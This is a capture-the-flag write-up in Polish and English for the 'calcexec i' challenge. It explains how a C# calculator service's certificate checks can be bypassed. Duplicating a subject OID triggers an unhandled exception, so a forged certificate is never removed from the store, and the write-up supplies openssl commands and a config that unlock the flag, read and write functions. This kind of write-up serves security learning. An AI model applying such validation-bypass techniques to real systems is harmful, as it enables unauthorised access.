﻿## calcexec i (pwn, 200p, 7 solves)

> 2+2 == [5](calc.exe)?  
> nc 185.82.202.146 1337

### pl
[eng](#eng-version)

zadanie to usługa ewaluatora wyrażeń matematycznych napisana w c#. widzimy, że jedną z funkcji ewalutora jest wypisanie nam flagi.

```csharp
calcengine.registerfunction("flag", 0, (p => file.readalltext("flag1")));
```

niestety, konstruktor ewalutora przyjmuje listę dozwolonych funkcji i domyślnie jest ona pusta. możemy natomiast je podać w certyfikacie x509 w jego dodatkowym rozszerzeniu.

```csharp
x509extension x509extension = cert.extensions["1.1.1337.7331"];
if (x509extension != null)
	calcengine = program.initcalcengine(enumerable.toarray(
		enumerable.select(encoding.default.getstring(
			x509extension.rawdata).split(','), (x => x.trim()))));
```

niestety nie możemy wysłać jednak dowolnego certyfikatu. są one w kilku krokach weryfikowane.

nie możemy podać certyfikatu o subjekcie już wczytanego:

```csharp
string key = new x509name(x509certificate2.subject).tostring();
if (this.items.containskey(key))
	throw new exception("certificate is already loaded!");
```

subject certyfikatu musi zawierać podany identifier:
```csharp
return enumerable.singleordefault(enumerable.oftype<string>(
	new x509name(cert.subject).getvalues(
		new derobjectidentifier("2.5.4.1337")))) == "calc.exe";
```

issuer certyfikatu nie może być nim sam:
```csharp
string name1 = new x509name(certificatename).tostring();
x509certificate2 certificatebyname = this.store.findcertificatebyname(name1);
string name2 = new x509name(certificatebyname.issuer).tostring();
if (name2 == name1)
	return false;
```

oraz ostatecznie jest sprawdzana jego sygnatura kluczem publicznym wczytanego wcześniej issuera.
```csharp
asn1sequence asn1sequence = new asn1inputstream(this.store.findcertificatebyname(name2)
	.getpublickey()).readobject();
dotnetutilities.fromx509certificate(certificatebyname).verify(
	new rsakeyparameters(false, ((derinteger) asn1sequence[0]).value,
		((derinteger) asn1sequence[1]).value));
```

jeżeli któryś z checków nie powiedzie się, wczytany certyfikat jest usuwany ze store'a.

żeby móc wczytać własny certyfikat musimy znaleźć lukę w którymś z powyższych kodów. dwa ostatnie zamknięte były w bloku try-catch, ale jeżeli udałoby się wywołać wyjątek w jednym z pozostałych to certyfikat nie zostałby usunięty.

okazuje się, że certyfikaty x509 mogą posiadać wiele identyfikatorów z tą samą nazwą. jeżeli więc spreparujemy certyfikat z więcej niż jednym identyfikatorem "2.5.4.1337" spowoduje to wyjątek przy wywołaniu `singleordefault()`, które oczekuje co najwyżej jednego elementu.

gdyby w ten sposób udało się wczytać certyfikat to będziemy mogli stworzyć certyfikat, który przejdzie wszystkie te checki.

```
openssl req -new -nodes -keyout ca.key -subj "/cn=mycalc/o=mycalc/ou=mycalc/calc=mycalc/calc=mycalc" > ca.csr
openssl x509 -sha1 -req -signkey ca.key < ca.csr > ca.crt
openssl req -new -nodes -keyout client.key -config config -extensions cert_extensions > client.csr
openssl x509 -extfile config -extensions cert_extensions -sha1 -req -cakey ca.key -ca ca.crt < client.csr > client.crt 
```

oraz plik konfiguracyjny dla openssl:

```
oid_section	= new_oids 
[ new_oids ] 
fooname = 2.5.4.1337

[ req ] 
default_bits       = 2048 
distinguished_name = req_distinguished_name 
attributes         = req_attributes 
prompt             = no 
x509_extensions    = cert_extensions

[ req_distinguished_name ] 
fooname = calc.exe
cn = calc.exe
o = calc.exe
emailaddress = calc@asis-ctf.ir
l = iran
c = ir

[ req_attributes ] 

[ cert_extensions ] 
1.1.1337.7331 = asn1:utf8:abs,acos,asin,atan,atan2,ceiling,cos,cosh,exp,floor,int,ln,log,log10,pi,power,rand,randbetween,sign,sin,sinh,sqrt,sum,sumif,tan,tanh,trunc,average,averagea,count,counta,countblank,countif,max,maxa,min,mina,stdev,stdeva,stdevp,stdevpa,var,vara,varp,varpa,char,code,concatenate,find,left,len,lower,mid,proper,read,replace,rept,right,search,substitute,t,text,trim,upper,value,write,flag
```

w ten sposób przygotowane certyfikaty udaje się wczytać do programu oraz wywołać funkcję flag.

`asis{e5cb5e25f77c1da6626fb78a48a678f3}`

### eng version

the task is a mathematical expressions evaluator service written in c#. we can see that one of the functions is printing the flag.

```csharp
calcengine.registerfunction("flag", 0, (p => file.readalltext("flag1")));
```

unfortunately, the evaluator constructor takes a list of allowed functions and by default it's empty. we can, however, add those in x509 certificates in the added extension.

```csharp
x509extension x509extension = cert.extensions["1.1.1337.7331"];
if (x509extension != null)
	calcengine = program.initcalcengine(enumerable.toarray(
		enumerable.select(encoding.default.getstring(
			x509extension.rawdata).split(','), (x => x.trim()))));
```

however, we can't just send any certificate. they are verified in multiple steps.

we can't send a certificate with already loaded subject:

```csharp
string key = new x509name(x509certificate2.subject).tostring();
if (this.items.containskey(key))
	throw new exception("certificate is already loaded!");
```

subject of the certificate has to contain given identifier:
```csharp
return enumerable.singleordefault(enumerable.oftype<string>(
	new x509name(cert.subject).getvalues(
		new derobjectidentifier("2.5.4.1337")))) == "calc.exe";
```

certificate issuer can't be himself:
```csharp
string name1 = new x509name(certificatename).tostring();
x509certificate2 certificatebyname = this.store.findcertificatebyname(name1);
string name2 = new x509name(certificatebyname.issuer).tostring();
if (name2 == name1)
	return false;
```

and finally it is checked with public key of the issuer read previously.
```csharp
asn1sequence asn1sequence = new asn1inputstream(this.store.findcertificatebyname(name2)
	.getpublickey()).readobject();
dotnetutilities.fromx509certificate(certificatebyname).verify(
	new rsakeyparameters(false, ((derinteger) asn1sequence[0]).value,
		((derinteger) asn1sequence[1]).value));
```

if any of the checks fails the certificate is removed from the store.

in order to be able to load our own certificate we need to find a loophole in one of the codes above. the last two are in try-catch block, but if we could raise an exception in one of the remaining ones then the certificate would not get removed.

it turns out that x509 certificates can have multiple identifiers with the same name. therefore if we prepare a certificate with more than one identifier "2.5.4.1337" it will cause an exception during `singleordefault()` call, which expects at most one element.

if we could load a certificate this way, we could create a certificate which will pass all the checks.

```
openssl req -new -nodes -keyout ca.key -subj "/cn=mycalc/o=mycalc/ou=mycalc/calc=mycalc/calc=mycalc" > ca.csr
openssl x509 -sha1 -req -signkey ca.key < ca.csr > ca.crt
openssl req -new -nodes -keyout client.key -config config -extensions cert_extensions > client.csr
openssl x509 -extfile config -extensions cert_extensions -sha1 -req -cakey ca.key -ca ca.crt < client.csr > client.crt 
```

and the openssl config file:

```
oid_section	= new_oids 
[ new_oids ] 
fooname = 2.5.4.1337

[ req ] 
default_bits       = 2048 
distinguished_name = req_distinguished_name 
attributes         = req_attributes 
prompt             = no 
x509_extensions    = cert_extensions

[ req_distinguished_name ] 
fooname = calc.exe
cn = calc.exe
o = calc.exe
emailaddress = calc@asis-ctf.ir
l = iran
c = ir

[ req_attributes ] 

[ cert_extensions ] 
1.1.1337.7331 = asn1:utf8:abs,acos,asin,atan,atan2,ceiling,cos,cosh,exp,floor,int,ln,log,log10,pi,power,rand,randbetween,sign,sin,sinh,sqrt,sum,sumif,tan,tanh,trunc,average,averagea,count,counta,countblank,countif,max,maxa,min,mina,stdev,stdeva,stdevp,stdevpa,var,vara,varp,varpa,char,code,concatenate,find,left,len,lower,mid,proper,read,replace,rept,right,search,substitute,t,text,trim,upper,value,write,flag
```

we succeed in loading certificates prepared this way and call the flag function: `asis{e5cb5e25f77c1da6626fb78a48a678f3}`
